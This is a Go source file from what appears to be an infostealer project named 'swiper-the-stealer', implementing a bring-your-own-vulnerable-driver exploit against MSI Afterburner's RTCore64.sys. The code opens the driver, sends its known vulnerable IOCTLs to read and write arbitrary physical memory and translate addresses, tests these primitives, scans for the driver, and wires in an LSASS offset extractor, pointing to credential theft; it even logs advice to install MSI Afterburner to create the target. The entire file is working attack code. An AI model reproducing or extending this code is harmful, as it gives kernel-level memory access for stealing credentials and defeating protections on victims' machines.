package byovd

import (
	"fmt"
	"syscall"
	"unsafe"

	"swiper-the-stealer/pkg/logger"
)

// RTCore64 driver constants
const (
	RTCoreDeviceName = `\\.\RTCore64`

	// Alternative device names to try
	RTCoreDeviceNameAlt1 = `\\.\RTCORE64`
	RTCoreDeviceNameAlt2 = `\\.\rtcore64`
	RTCoreDeviceNameAlt3 = `\\.\Global\RTCore64`

	// Known vulnerable IOCTLs
	IOCTL_RTCORE_READ_PHYS_MEM  = 0x80002048
	IOCTL_RTCORE_WRITE_PHYS_MEM = 0x8000204C
	IOCTL_RTCORE_GET_PHYS_ADDR  = 0x80002040
	IOCTL_RTCORE_VIRT_TO_PHYS   = 0x80002044
)

// RTCoreMemoryRequest represents the structure for IOCTL communication
type RTCoreMemoryRequest struct {
	PhysicalAddress uint64
	VirtualAddress  uint64
	Size            uint32
	Padding         uint32
}

// RTCoreExploit handles RTCore64.sys exploitation
type RTCoreExploit struct {
	deviceHandle syscall.Handle
	logger       *logger.Logger
}

// NewRTCoreExploit creates a new RTCore64.sys exploit instance
func NewRTCoreExploit(logger *logger.Logger) *RTCoreExploit {
	return &RTCoreExploit{
		deviceHandle: syscall.InvalidHandle,
		logger:       logger,
	}
}

// NewLsassOffsetExtractor creates a new LSASS offset extractor using this RTCore instance
func (rt *RTCoreExploit) NewLsassOffsetExtractor(rtcoreExploit *RTCoreExploit, logger *logger.Logger) *LsassOffsetExtractor {
	return NewLsassOffsetExtractor(rtcoreExploit, logger)
}

// Initialize opens connection to RTCore64.sys driver
func (rt *RTCoreExploit) Initialize() error {
	rt.logger.Info("Initializing RTCore64.sys BYOVD exploitation...")
	rt.logger.Info("Detecting MSI Afterburner RTCore64.sys driver usage...")

	// Try multiple device names for RTCore64
	deviceNames := []string{
		RTCoreDeviceName,     // \\.\RTCore64
		RTCoreDeviceNameAlt1, // \\.\RTCORE64
		RTCoreDeviceNameAlt2, // \\.\rtcore64
		RTCoreDeviceNameAlt3, // \\.\Global\RTCore64
	}

	var lastErr error
	for _, deviceName := range deviceNames {
		rt.logger.Infof("Trying device name: %s", deviceName)

		// Convert device name to UTF16
		deviceNamePtr, err := syscall.UTF16PtrFromString(deviceName)
		if err != nil {
			lastErr = fmt.Errorf("failed to convert device name %s: %v", deviceName, err)
			continue
		}

		// Open device handle with shared access (MSI Afterburner compatibility)
		handle, err := syscall.CreateFile(
			deviceNamePtr,
			syscall.GENERIC_READ|syscall.GENERIC_WRITE,
			syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE, // Allow sharing with MSI Afterburner
			nil,
			syscall.OPEN_EXISTING,
			syscall.FILE_ATTRIBUTE_NORMAL,
			0,
		)

		if err != nil {
			rt.logger.Warnf("Failed to open %s: %v", deviceName, err)
			lastErr = err
			continue
		}

		// Success!
		rt.deviceHandle = handle
		rt.logger.Infof("Successfully opened RTCore64.sys via: %s", deviceName)
		rt.logger.Info("RTCore64.sys BYOVD exploitation ready (MSI Afterburner coexistence)")
		return nil
	}

	return fmt.Errorf("failed to open RTCore64 device with any name: %v (MSI Afterburner must be running to load RTCore64.sys)", lastErr)
}

// Close cleans up the device handle
func (rt *RTCoreExploit) Close() error {
	if rt.deviceHandle != syscall.InvalidHandle {
		err := syscall.CloseHandle(rt.deviceHandle)
		rt.deviceHandle = syscall.InvalidHandle
		rt.logger.Info("RTCore64.sys device handle closed")
		return err
	}
	return nil
}

// ReadPhysicalMemory reads arbitrary physical memory via RTCore64.sys
func (rt *RTCoreExploit) ReadPhysicalMemory(physicalAddress uint64, size uint32) ([]byte, error) {
	if rt.deviceHandle == syscall.InvalidHandle {
		return nil, fmt.Errorf("RTCore64 device not initialized")
	}

	request := RTCoreMemoryRequest{
		PhysicalAddress: physicalAddress,
		Size:            size,
	}

	buffer := make([]byte, size)
	var bytesReturned uint32

	// Use proper Windows API call
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	deviceIoControl := kernel32.NewProc("DeviceIoControl")

	r1, _, err := deviceIoControl.Call(
		uintptr(rt.deviceHandle),
		uintptr(IOCTL_RTCORE_READ_PHYS_MEM),
		uintptr(unsafe.Pointer(&request)),
		uintptr(unsafe.Sizeof(request)),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&bytesReturned)),
		0,
	)

	if r1 == 0 {
		return nil, fmt.Errorf("DeviceIoControl failed: %v", err)
	}

	rt.logger.Debugf("Read %d bytes from physical address 0x%016x", bytesReturned, physicalAddress)
	return buffer[:bytesReturned], nil
}

// WritePhysicalMemory writes arbitrary physical memory via RTCore64.sys
func (rt *RTCoreExploit) WritePhysicalMemory(physicalAddress uint64, data []byte) error {
	if rt.deviceHandle == syscall.InvalidHandle {
		return fmt.Errorf("RTCore64 device not initialized")
	}

	request := RTCoreMemoryRequest{
		PhysicalAddress: physicalAddress,
		Size:            uint32(len(data)),
	}

	var bytesReturned uint32

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	deviceIoControl := kernel32.NewProc("DeviceIoControl")

	r1, _, err := deviceIoControl.Call(
		uintptr(rt.deviceHandle),
		uintptr(IOCTL_RTCORE_WRITE_PHYS_MEM),
		uintptr(unsafe.Pointer(&request)),
		uintptr(unsafe.Sizeof(request)),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesReturned)),
		0,
	)

	if r1 == 0 {
		return fmt.Errorf("DeviceIoControl write failed: %v", err)
	}

	rt.logger.Debugf("Wrote %d bytes to physical address 0x%016x", bytesReturned, physicalAddress)
	return nil
}

// GetPhysicalAddress converts virtual address to physical address
func (rt *RTCoreExploit) GetPhysicalAddress(virtualAddress uint64) (uint64, error) {
	if rt.deviceHandle == syscall.InvalidHandle {
		return 0, fmt.Errorf("RTCore64 device not initialized")
	}

	request := RTCoreMemoryRequest{
		VirtualAddress: virtualAddress,
	}

	var physicalAddress uint64
	var bytesReturned uint32

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	deviceIoControl := kernel32.NewProc("DeviceIoControl")

	r1, _, err := deviceIoControl.Call(
		uintptr(rt.deviceHandle),
		uintptr(IOCTL_RTCORE_VIRT_TO_PHYS),
		uintptr(unsafe.Pointer(&request)),
		uintptr(unsafe.Sizeof(request)),
		uintptr(unsafe.Pointer(&physicalAddress)),
		uintptr(unsafe.Sizeof(physicalAddress)),
		uintptr(unsafe.Pointer(&bytesReturned)),
		0,
	)

	if r1 == 0 {
		return 0, fmt.Errorf("Virtual to physical translation failed: %v", err)
	}

	rt.logger.Debugf("Virtual 0x%016x -> Physical 0x%016x", virtualAddress, physicalAddress)
	return physicalAddress, nil
}

// TestExploitation performs basic tests of RTCore64.sys exploitation
func (rt *RTCoreExploit) TestExploitation() error {
	rt.logger.Info("Testing RTCore64.sys exploitation capabilities...")

	// Test 1: Read from safe physical memory location (first page)
	rt.logger.Debug("Test 1: Reading from physical memory 0x1000")
	data, err := rt.ReadPhysicalMemory(0x1000, 16)
	if err != nil {
		return fmt.Errorf("physical memory read test failed: %v", err)
	}

	rt.logger.Debugf("Physical memory read successful: %x", data)

	// Test 2: Virtual to physical translation
	rt.logger.Debug("Test 2: Virtual to physical address translation")
	testAddr := uintptr(unsafe.Pointer(&data[0]))
	physAddr, err := rt.GetPhysicalAddress(uint64(testAddr))
	if err != nil {
		return fmt.Errorf("virtual to physical translation test failed: %v", err)
	}

	rt.logger.Debugf("Address translation successful: 0x%016x -> 0x%016x", testAddr, physAddr)

	rt.logger.Info("RTCore64.sys exploitation tests completed successfully!")
	return nil
}

// ScanForVulnerableDrivers checks if RTCore64.sys is available for exploitation
func ScanForVulnerableDrivers(logger *logger.Logger) []string {
	var foundDrivers []string

	logger.Info("Scanning for exploitable BYOVD targets...")

	// Check for RTCore64.sys
	deviceName, _ := syscall.UTF16PtrFromString(RTCoreDeviceName)
	handle, err := syscall.CreateFile(
		deviceName,
		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
		0,
		nil,
		syscall.OPEN_EXISTING,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if err == nil {
		syscall.CloseHandle(handle)
		foundDrivers = append(foundDrivers, "RTCore64.sys")
		logger.Info("Found RTCore64.sys - MSI Afterburner BYOVD target available")
	}

	// Can add more driver checks here (DBUtilDrv2, gdrv, etc.)

	if len(foundDrivers) == 0 {
		logger.Warn("No vulnerable BYOVD targets found on system")
		logger.Info("Consider installing MSI Afterburner for RTCore64.sys")
	}

	return foundDrivers
}
